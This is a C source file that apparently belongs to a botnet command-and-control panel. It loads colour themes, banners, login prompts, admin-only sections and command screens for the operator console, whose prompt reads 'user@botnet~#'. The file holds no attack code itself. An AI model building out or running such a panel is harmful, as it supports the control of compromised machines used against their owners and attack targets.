#include "../headers/theme_loader.h"
#include "../headers/botnet.h"
#include "../headers/colors.h"
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/socket.h>

typedef struct {
    char name[32];
    char code[16];
} ColorCode;

static ColorCode colors[64];
static int color_count = 0;
static int colors_loaded = 0;

static void process_escape_sequences(const char *input, char *output, int max_len) {
    int out_pos = 0;
    for (int i = 0; input[i] && out_pos < max_len - 1; i++) {
        if (input[i] == '\\' && input[i+1] == '0' && input[i+2] == '3' && input[i+3] == '3') {
            output[out_pos++] = '\033';
            i += 3;
        } else if (input[i] == '\\' && input[i+1] == 'r') {
            output[out_pos++] = '\r';
            i++;
        } else if (input[i] == '\\' && input[i+1] == 'n') {
            output[out_pos++] = '\n';
            i++;
        } else if (input[i] == '\\' && input[i+1] == 't') {
            output[out_pos++] = '\t';
            i++;
        } else if (input[i] == '\\' && input[i+1] == 'R') {
            output[out_pos++] = '\r';
            i++;
        } else {
            output[out_pos++] = input[i];
        }
    }
    output[out_pos] = '\0';
}

void load_color_codes_internal() {
    if (colors_loaded) return;
    
    FILE *cf = fopen("themes/colors.txt", "r");
    if (!cf) {
        colors_loaded = 1;
        return;
    }
    
    char line[128];
    while (fgets(line, sizeof(line), cf) && color_count < 64) {
        char name[32], code[16];
        if (sscanf(line, "%31s = \"%15[^\"]\"", name, code) == 2) {
            strncpy(colors[color_count].name, name, sizeof(colors[color_count].name)-1);
            colors[color_count].name[sizeof(colors[color_count].name)-1] = '\0';
            
            char processed_code[32];
            process_escape_sequences(code, processed_code, sizeof(processed_code));
            strncpy(colors[color_count].code, processed_code, sizeof(colors[color_count].code)-1);
            colors[color_count].code[sizeof(colors[color_count].code)-1] = '\0';
            color_count++;
        }
    }
    fclose(cf);
    colors_loaded = 1;
}

int theme_exists(const char *theme_name) {
    char theme_path[256];
    struct stat st = {0};
    snprintf(theme_path, sizeof(theme_path), "themes/%s", theme_name);
    return stat(theme_path, &st) == 0 && S_ISDIR(st.st_mode);
}

char** get_available_themes(int *count) {
    *count = 0;
    DIR *d = opendir("themes");
    if (!d) return NULL;
    
    char **themes = malloc(sizeof(char*) * 32);
    if (!themes) {
        closedir(d);
        return NULL;
    }
    
    struct dirent *entry;
    while ((entry = readdir(d)) && *count < 32) {
        if (entry->d_name[0] == '.') continue;
        char theme_path[512];
        snprintf(theme_path, sizeof(theme_path), "themes/%s", entry->d_name);
        struct stat st = {0};
        if (stat(theme_path, &st) == 0 && S_ISDIR(st.st_mode)) {
            themes[*count] = malloc(strlen(entry->d_name) + 1);
            if (themes[*count]) {
                strcpy(themes[*count], entry->d_name);
                (*count)++;
            }
        }
    }
    closedir(d);
    return themes;
}

void free_theme_list(char **themes, int count) {
    if (!themes) return;
    for (int i = 0; i < count; i++) {
        if (themes[i]) free(themes[i]);
    }
    free(themes);
}

void free_theme_string(char *str) {
    if (str) free(str);
}

char* load_theme_file(const char *filename, const User *user) {
    load_color_codes_internal();
    
    const char *theme = user && user->current_theme[0] ? user->current_theme : "classic";
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "themes/%s/%s", theme, filename);
    
    FILE *f = fopen(filepath, "r");
    if (!f) {
        char *err = malloc(128);
        snprintf(err, 128, "Error: Could not load theme file %s\r\n", filename);
        return err;
    }
    
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    rewind(f);
    
    char *raw_content = malloc(fsize + 1);
    if (!raw_content) {
        fclose(f);
        char *err = malloc(1);
        err[0] = '\0';
        return err;
    }
    if (fread(raw_content, 1, (size_t)fsize, f) != (size_t)fsize) {
        free(raw_content);
        fclose(f);
        char *err = malloc(1);
        err[0] = '\0';
        return err;
    }
    fclose(f);
    raw_content[fsize] = '\0';
    
    char *result = malloc(fsize * 2 + 512);
    if (!result) {
        free(raw_content);
        char *err = malloc(1);
        err[0] = '\0';
        return err;
    }
    
    int result_pos = 0;
    int max_result = fsize * 2 + 512;
    const char *p = raw_content;
    int skip_until_end_admin = 0;
    
    while (*p) {
        if (strncmp(p, "{ADMINONLY}", 11) == 0) {
            if (!user->is_admin) {
                skip_until_end_admin = 1;
            }
            p += 11;
            continue;
        }
        
        if (strncmp(p, "{/ADMINONLY}", 12) == 0) {
            if (skip_until_end_admin) {
                skip_until_end_admin = 0;
                p += 12;
                // Skip trailing escape sequences after {/ADMINONLY} for non-admins
                while (*p && (*p == '\\' || *p == '\r' || *p == '\n')) {
                    if (*p == '\\' && *(p+1) == 'r') {
                        p += 2;
                    } else if (*p == '\\' && *(p+1) == 'n') {
                        p += 2;
                    } else if (*p == '\r' || *p == '\n') {
                        p++;
                    } else {
                        break;
                    }
                }
            } else {
                p += 12;
            }
            continue;
        }
        
        if (skip_until_end_admin) {
            p++;
            continue;
        }
        
        if (*p == '\\' && *(p+1)) {
            char next = *(p+1);
            if (next == 'r') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\r';
                }
                p += 2;
                continue;
            } else if (next == 'n') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\n';
                }
                p += 2;
                continue;
            } else if (next == 't') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\t';
                }
                p += 2;
                continue;
            }
        }
        
        if (*p == '{') {
            const char *close = strchr(p, '}');
            if (close) {
                int len = close - p - 1;
                char color_name[32];
                strncpy(color_name, p + 1, len);
                color_name[len] = '\0';
                
                int found = 0;
                for (int i = 0; i < color_count; i++) {
                    if (strcmp(colors[i].name, color_name) == 0) {
                        int code_len = strlen(colors[i].code);
                        if (result_pos + code_len < max_result) {
                            strcpy(result + result_pos, colors[i].code);
                            result_pos += code_len;
                        }
                        found = 1;
                        break;
                    }
                }
                if (!found) {
                    if (result_pos + len + 2 < max_result) {
                        result[result_pos++] = '{';
                        strcpy(result + result_pos, color_name);
                        result_pos += len;
                        result[result_pos++] = '}';
                    }
                }
                p = close + 1;
                continue;
            }
        }
        
        if (result_pos < max_result - 1) {
            result[result_pos++] = *p;
        }
        p++;
    }
    result[result_pos] = '\0';
    
    free(raw_content);
    return result;
}

char* process_string_colors(const char *input) {
    if (!input) return NULL;
    
    load_color_codes_internal();
    
    int input_len = strlen(input);
    char *result = malloc(input_len * 2 + 128);
    if (!result) return NULL;
    
    int result_pos = 0;
    int max_result = input_len * 2 + 128;
    const char *p = input;
    
    while (*p) {
        if (*p == '\\' && *(p+1)) {
            char next = *(p+1);
            if (next == 'r') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\r';
                }
                p += 2;
                continue;
            } else if (next == 'n') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\n';
                }
                p += 2;
                continue;
            } else if (next == 't') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\t';
                }
                p += 2;
                continue;
            }
        }
        
        if (*p == '{') {
            const char *close = strchr(p, '}');
            if (close) {
                int len = close - p - 1;
                char color_name[32];
                strncpy(color_name, p + 1, len);
                color_name[len] = '\0';
                
                int found = 0;
                for (int i = 0; i < color_count; i++) {
                    if (strcmp(colors[i].name, color_name) == 0) {
                        int code_len = strlen(colors[i].code);
                        if (result_pos + code_len < max_result) {
                            strcpy(result + result_pos, colors[i].code);
                            result_pos += code_len;
                        }
                        found = 1;
                        break;
                    }
                }
                if (!found) {
                    p = close + 1;
                    continue;
                }
                p = close + 1;
                continue;
            }
        }
        
        if (result_pos < max_result - 1) {
            result[result_pos++] = *p;
        }
        p++;
    }
    result[result_pos] = '\0';
    
    return result;
}

char* load_placeholder_with_subs(const User *user, const char *username) {
    load_color_codes_internal();
    
    const char *theme = user && user->current_theme[0] ? user->current_theme : "classic";
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "themes/%s/placeholder.txt", theme);
    
    FILE *f = fopen(filepath, "r");
    if (!f) {
        char *err = malloc(256);
        snprintf(err, 256, "\r%s%s%s@botnet~# %s", GRAY, username ? username : "user", GRAY, RESET);
        return err;
    }
    
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    rewind(f);
    
    char *raw_content = malloc(fsize + 1);
    if (!raw_content) {
        fclose(f);
        char *err = malloc(256);
        snprintf(err, 256, "\r%s%s%s@botnet~# %s", GRAY, username ? username : "user", GRAY, RESET);
        return err;
    }
    if (fread(raw_content, 1, (size_t)fsize, f) != (size_t)fsize) {
        free(raw_content);
        fclose(f);
        char *err = malloc(256);
        snprintf(err, 256, "\r%s%s%s@botnet~# %s", GRAY, username ? username : "user", GRAY, RESET);
        return err;
    }
    fclose(f);
    raw_content[fsize] = '\0';
    
    char *result = malloc(fsize * 2 + 256);
    if (!result) {
        free(raw_content);
        char *err = malloc(256);
        snprintf(err, 256, "\r%s%s%s@botnet~# %s", GRAY, username ? username : "user", GRAY, RESET);
        return err;
    }
    
    char defines_path[256];
    snprintf(defines_path, sizeof(defines_path), "themes/%s/defines.txt", theme);
    FILE *df = fopen(defines_path, "r");
    char placeholder_name[64] = "Botnet";
    if (df) {
        char line[256];
        while (fgets(line, sizeof(line), df)) {
            if (strncmp(line, "[PLACEHOLDER]:", 14) == 0) {
                char *start = line + 14;
                while (*start == ' ') start++;
                char *end = strchr(start, '\r');
                if (!end) end = strchr(start, '\n');
                if (!end) end = start + strlen(start);
                int len = end - start;
                if (len > 0 && len < 63) {
                    strncpy(placeholder_name, start, len);
                    placeholder_name[len] = '\0';
                }
                break;
            }
        }
        fclose(df);
    }
    
    int result_pos = 0;
    int max_result = fsize * 2 + 256;
    const char *p = raw_content;
    
    while (*p) {
        if (strncmp(p, "[USER]", 6) == 0) {
            if (username) {
                int len = strlen(username);
                if (result_pos + len < max_result) {
                    strcpy(result + result_pos, username);
                    result_pos += len;
                }
            }
            p += 6;
            continue;
        }
        
        if (strncmp(p, "[PLACEHOLDER]", 13) == 0) {
            int len = strlen(placeholder_name);
            if (result_pos + len < max_result) {
                strcpy(result + result_pos, placeholder_name);
                result_pos += len;
            }
            p += 13;
            continue;
        }
        
        if (*p == '\\' && *(p+1)) {
            char next = *(p+1);
            if (next == 'r') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\r';
                }
                p += 2;
                continue;
            } else if (next == 'n') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\n';
                }
                p += 2;
                continue;
            } else if (next == 't') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\t';
                }
                p += 2;
                continue;
            } else if (next == 'R') {
                if (result_pos < max_result - 1) {
                    result[result_pos++] = '\r';
                }
                p += 2;
                continue;
            }
        }
        
        if (*p == '{') {
            const char *close = strchr(p, '}');
            if (close) {
                int len = close - p - 1;
                char color_name[32];
                strncpy(color_name, p + 1, len);
                color_name[len] = '\0';
                
                int found = 0;
                for (int i = 0; i < color_count; i++) {
                    if (strcmp(colors[i].name, color_name) == 0) {
                        int code_len = strlen(colors[i].code);
                        if (result_pos + code_len < max_result) {
                            strcpy(result + result_pos, colors[i].code);
                            result_pos += code_len;
                        }
                        found = 1;
                        break;
                    }
                }
                if (!found) {
                    if (*p == '{' && result_pos < max_result - 1) {
                        result[result_pos++] = *p;
                    }
                }
                p = close + 1;
                continue;
            }
        }
        
        if (result_pos < max_result - 1) {
            result[result_pos++] = *p;
        }
        p++;
    }
    result[result_pos] = '\0';
    
    free(raw_content);
    return result;
}

char* load_placeholder(const User *user) {
    return load_placeholder_with_subs(user, user ? user->user : "user");
}

LoginTheme* load_login_theme(const User *user) {
    load_color_codes_internal();
    
    const char *theme = user && user->current_theme[0] ? user->current_theme : "classic";
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "themes/%s/login_theme.txt", theme);
    
    FILE *f = fopen(filepath, "r");
    if (!f) {
        LoginTheme *def = malloc(sizeof(LoginTheme));
        snprintf(def->user_prompt, sizeof(def->user_prompt), "%s", "Username: ");
        snprintf(def->pass_prompt, sizeof(def->pass_prompt), "%s", "Password: ");
        return def;
    }
    
    LoginTheme *theme_obj = malloc(sizeof(LoginTheme));
    if (!theme_obj) {
        fclose(f);
        return NULL;
    }
    
    memset(theme_obj, 0, sizeof(LoginTheme));
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\n\r")] = 0;
        
        if (strncmp(line, "USER_PROMPT:", 12) == 0) {
            char *content = line + 12;
            while (*content == ' ') content++;
            
            char *result = malloc(256);
            int pos = 0;
            const char *p = content;
            while (*p && pos < 127) {
                if (*p == '\\' && *(p+1)) {
                    char next = *(p+1);
                    if (next == 'r') {
                        if (pos < 127) result[pos++] = '\r';
                        p += 2;
                        continue;
                    } else if (next == 'n') {
                        if (pos < 127) result[pos++] = '\n';
                        p += 2;
                        continue;
                    } else if (next == 't') {
                        if (pos < 127) result[pos++] = '\t';
                        p += 2;
                        continue;
                    } else if (next == 'R') {
                        if (pos < 127) result[pos++] = '\r';
                        p += 2;
                        continue;
                    }
                }
                
                if (*p == '{') {
                    const char *close = strchr(p, '}');
                    if (close) {
                        int len = close - p - 1;
                        char color_name[32];
                        strncpy(color_name, p + 1, len);
                        color_name[len] = '\0';
                        
                        int found = 0;
                        for (int i = 0; i < color_count; i++) {
                            if (strcmp(colors[i].name, color_name) == 0) {
                                int clen = strlen(colors[i].code);
                                if (pos + clen < 127) {
                                    strcpy(result + pos, colors[i].code);
                                    pos += clen;
                                }
                                found = 1;
                                break;
                            }
                        }
                        if (!found && pos + len + 2 < 127) {
                            result[pos++] = '{';
                            strcpy(result + pos, color_name);
                            pos += len;
                            result[pos++] = '}';
                        }
                        p = close + 1;
                        continue;
                    }
                }
                if (pos < 127) result[pos++] = *p;
                p++;
            }
            result[pos] = '\0';
            strncpy(theme_obj->user_prompt, result, sizeof(theme_obj->user_prompt) - 1);
            free(result);
        } else if (strncmp(line, "PASS_PROMPT:", 12) == 0) {
            char *content = line + 12;
            while (*content == ' ') content++;
            
            char *result = malloc(256);
            int pos = 0;
            const char *p = content;
            while (*p && pos < 127) {
                if (*p == '{') {
                    const char *close = strchr(p, '}');
                    if (close) {
                        int len = close - p - 1;
                        char color_name[32];
                        strncpy(color_name, p + 1, len);
                        color_name[len] = '\0';
                        
                        int found = 0;
                        for (int i = 0; i < color_count; i++) {
                            if (strcmp(colors[i].name, color_name) == 0) {
                                int clen = strlen(colors[i].code);
                                if (pos + clen < 127) {
                                    strcpy(result + pos, colors[i].code);
                                    pos += clen;
                                }
                                found = 1;
                                break;
                            }
                        }
                        if (!found && pos + len + 2 < 127) {
                            result[pos++] = '{';
                            strcpy(result + pos, color_name);
                            pos += len;
                            result[pos++] = '}';
                        }
                        p = close + 1;
                        continue;
                    }
                }
                if (pos < 127) result[pos++] = *p;
                p++;
            }
            result[pos] = '\0';
            strncpy(theme_obj->pass_prompt, result, sizeof(theme_obj->pass_prompt) - 1);
            free(result);
        }
    }
    fclose(f);
    return theme_obj;
}

void free_login_theme(LoginTheme *theme) {
    if (theme) free(theme);
}

#define MAX_PREFIXES 64

typedef struct {
    char prefix[64];
    char filename[64];
} PrefixEntry;

static PrefixEntry prefix_cache[MAX_PREFIXES];
static int prefix_cache_count = 0;
static char prefix_cache_theme[64] = "";

char* handle_prefix_command(const User *user, const char *command) {
    if (!command || command[0] != '!') return NULL;

    const char *theme = user && user->current_theme[0] ? user->current_theme : "classic";

    if (strcmp(theme, prefix_cache_theme) != 0 || prefix_cache_count == 0) {
        prefix_cache_count = 0;
        strncpy(prefix_cache_theme, theme, sizeof(prefix_cache_theme) - 1);
        prefix_cache_theme[sizeof(prefix_cache_theme) - 1] = '\0';

        char filepath[256];
        snprintf(filepath, sizeof(filepath), "themes/%s/prefixes.txt", theme);

        FILE *f = fopen(filepath, "r");
        if (!f) return NULL;

        char line[512];
        while (fgets(line, sizeof(line), f) && prefix_cache_count < MAX_PREFIXES) {
            char *end = line + strlen(line) - 1;
            while (end >= line && (*end == '\n' || *end == '\r' || *end == ' ' || *end == '\t')) {
                *end = '\0'; end--;
            }
            if (line[0] == '#' || line[0] == '\0') continue;

            char *colon = strchr(line, ':');
            if (!colon) continue;

            *colon = '\0';
            char *filename = line;
            char *p = colon + 1;

            while (*p && *p != '[') p++;
            if (*p != '[') continue;
            p++;

            while (*p && prefix_cache_count < MAX_PREFIXES) {
                while (*p == ' ' || *p == '\t' || *p == ',') p++;
                if (*p == ']' || *p == '\0') break;
                if (*p == '"') {
                    p++;
                    char buf[64];
                    int bi = 0;
                    while (*p && *p != '"' && bi < 63) buf[bi++] = *p++;
                    buf[bi] = '\0';
                    if (*p == '"') p++;
                    if (bi > 0) {
                        strncpy(prefix_cache[prefix_cache_count].prefix, buf, 63);
                        prefix_cache[prefix_cache_count].prefix[63] = '\0';
                        strncpy(prefix_cache[prefix_cache_count].filename, filename, 63);
                        prefix_cache[prefix_cache_count].filename[63] = '\0';
                        prefix_cache_count++;
                    }
                }
            }
        }
        fclose(f);
    }

    for (int i = 0; i < prefix_cache_count; i++) {
        if (strcmp(command, prefix_cache[i].prefix) == 0) {
            return load_theme_file(prefix_cache[i].filename, user);
        }
    }

    return NULL;
}

char* load_banner(const User *user) {
    load_color_codes_internal();
    
    const char *theme = user && user->current_theme[0] ? user->current_theme : "classic";
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "themes/%s/banner.txt", theme);
    
    FILE *f = fopen(filepath, "r");
    if (!f) {
        char *err = malloc(1);
        err[0] = '\0';
        return err;
    }
    
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    rewind(f);
    
    char *raw_content = malloc(fsize + 1);
    if (!raw_content) {
        fclose(f);
        char *err = malloc(1);
        err[0] = '\0';
        return err;
    }
    if (fread(raw_content, 1, (size_t)fsize, f) != (size_t)fsize) {
        free(raw_content);
        fclose(f);
        char *err = malloc(1);
        err[0] = '\0';
        return err;
    }
    fclose(f);
    raw_content[fsize] = '\0';
    
    char *result = malloc(fsize * 2 + 128);
    if (!result) {
        free(raw_content);
        char *err = malloc(1);
        err[0] = '\0';
        return err;
    }
    
    int result_pos = 0;
    int max_result = fsize * 2 + 128;
    const char *p = raw_content;
    
    while (*p) {
        if (*p == '\\' && *(p+1)) {
            char next = *(p+1);
            if (next == 'r') {
                if (result_pos < max_result - 1) result[result_pos++] = '\r';
                p += 2;
                continue;
            } else if (next == 'n') {
                if (result_pos < max_result - 1) result[result_pos++] = '\n';
                p += 2;
                continue;
            } else if (next == 't') {
                if (result_pos < max_result - 1) result[result_pos++] = '\t';
                p += 2;
                continue;
            } else if (next == 'R') {
                if (result_pos < max_result - 1) result[result_pos++] = '\r';
                p += 2;
                continue;
            }
        }
        
        if (*p == '{') {
            const char *close = strchr(p, '}');
            if (close) {
                int len = close - p - 1;
                char color_name[32];
                strncpy(color_name, p + 1, len);
                color_name[len] = '\0';
                
                int found = 0;
                for (int i = 0; i < color_count; i++) {
                    if (strcmp(colors[i].name, color_name) == 0) {
                        int code_len = strlen(colors[i].code);
                        if (result_pos + code_len < max_result) {
                            strcpy(result + result_pos, colors[i].code);
                            result_pos += code_len;
                        }
                        found = 1;
                        break;
                    }
                }
                if (!found) {
                    if (result_pos + len + 2 < max_result) {
                        result[result_pos++] = '{';
                        strcpy(result + result_pos, color_name);
                        result_pos += len;
                        result[result_pos++] = '}';
                    }
                }
                p = close + 1;
                continue;
            }
        }
        
        if (result_pos < max_result - 1) {
            result[result_pos++] = *p;
        }
        p++;
    }
    result[result_pos] = '\0';
    
    free(raw_content);
    return result;
}

int themed_snprintf(char *dst, size_t n, const char *fmt, ...) {
    char tmp[8192];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    char *out = process_string_colors(tmp);
    if (!out) { dst[0] = 0; return -1; }
    strncpy(dst, out, n - 1);
    dst[n - 1] = 0;
    int r = (int)strlen(dst);
    free(out);
    return r;
}

int send_themed(int sock, const char *fmt, ...) {
    char tmp[8192];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    char *out = process_string_colors(tmp);
    if (!out) return -1;
    int r = send_line(sock, out);
    free(out);
    return r;
}
